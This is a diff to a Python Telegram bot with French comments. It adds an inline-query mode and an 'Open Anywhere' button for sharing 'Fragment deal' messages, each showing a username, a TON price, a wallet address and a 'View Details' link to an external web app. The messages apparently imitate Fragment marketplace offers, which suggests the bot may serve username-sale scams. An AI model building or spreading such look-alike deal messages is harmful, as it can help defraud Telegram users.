@@ -107,14 +107,18 @@ Important:
         entities.append(wallet_entity)
         print(f"🔗 Wallet entity: position {wallet_start}, longueur {len(wallet_address)}")
     
-    # 📱 BOUTON WEB APP IDENTIQUE - Reste exactement comme dans votre fichier original
+    # 📱 BOUTON HYBRIDE - EXACTEMENT le même "View Details" + bouton switch pour partout
     webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
-    keyboard = InlineKeyboardMarkup([[
-        InlineKeyboardButton(
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton(
             "View Details", 
             web_app=WebAppInfo(url=webapp_url)
-        )
-    ]])
+        )],
+        [InlineKeyboardButton(
+            "📱 Open Anywhere", 
+            switch_inline_query=f"webapp {username} {price:g}"
+        )]
+    ])
     
     print(f"🔗 Web App URL générée (identique): {webapp_url}")
     
@@ -127,13 +131,53 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         
-        # Parsing de la requête (username montant)
+        # Si pas de requête - AUCUNE RÉPONSE (utilisation privée)
+        if not query:
+            await update.inline_query.answer([], cache_time=0)
+            return
+        
         parts = query.split()
         
-        # Si format incorrect ou pas de requête - Affichage des résultats vides mais avec cache=0
-        if not query or len(parts) < 2:
-            # Retourner un résultat vide mais permettre l'affichage partout
-            await update.inline_query.answer([], cache_time=0, is_personal=False)
+        # 🎯 GESTION DE LA REQUÊTE WEBAPP (pour affichage partout)
+        if len(parts) >= 3 and parts[0] == "webapp":
+            username = parts[1].replace('@', '')
+            try:
+                ton_amount = float(parts[2])
+                if ton_amount <= 0:
+                    raise ValueError("Montant doit être positif")
+            except ValueError:
+                await update.inline_query.answer([], cache_time=0)
+                return
+            
+            # Génération direct de la WebApp pour affichage partout
+            webapp_url = f"{WEBAPP_URL}?user={username}&price={ton_amount:g}"
+            current_ton_price = get_ton_price()
+            current_usd_value = ton_amount * current_ton_price
+            
+            results = [
+                InlineQueryResultArticle(
+                    id=f"webapp_{username}_{ton_amount}_{int(time.time())}",
+                    title=f"📱 Fragment Details: @{username}",
+                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                    input_message_content=InputTextMessageContent(
+                        f"🔍 Fragment deal details for @{username}\n💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                        disable_web_page_preview=True
+                    ),
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton(
+                            "View Details", 
+                            web_app=WebAppInfo(url=webapp_url)
+                        )
+                    ]])
+                )
+            ]
+            
+            await update.inline_query.answer(results, cache_time=0, is_personal=False)
+            return
+        
+        # 🎯 GESTION NORMALE (username montant) - Message Fragment complet
+        if len(parts) < 2:
+            await update.inline_query.answer([], cache_time=0)
             return
         
         username = parts[0].replace('@', '')  # Supprime @ si présent
@@ -143,11 +187,10 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             if ton_amount <= 0:
                 raise ValueError("Montant doit être positif")
         except ValueError:
-            # Si montant invalide - Résultat vide mais affichage partout
-            await update.inline_query.answer([], cache_time=0, is_personal=False)
+            await update.inline_query.answer([], cache_time=0)
             return
         
-        # Génération du message Fragment avec le bouton IDENTIQUE à votre fichier
+        # Génération du message Fragment avec le bouton IDENTIQUE + bouton hybride
         fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
         # Prix pour affichage
@@ -164,17 +207,15 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                     entities=entities,
                     disable_web_page_preview=True
                 ),
-                reply_markup=keyboard  # Bouton IDENTIQUE à votre fichier original
+                reply_markup=keyboard  # Bouton IDENTIQUE + bouton hybride
             )
         ]
         
-        # 🎯 CLÉ IMPORTANTE: is_personal=False permet l'affichage partout
-        await update.inline_query.answer(results, cache_time=0, is_personal=False)
+        await update.inline_query.answer(results, cache_time=0)
         
     except Exception as e:
         print(f"❌ Erreur inline query: {e}")
-        # En cas d'erreur, résultat vide mais affichage partout
-        await update.inline_query.answer([], cache_time=0, is_personal=False)
+        await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
     """Gestionnaire webhook HTTP simple"""
@@ -220,7 +261,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
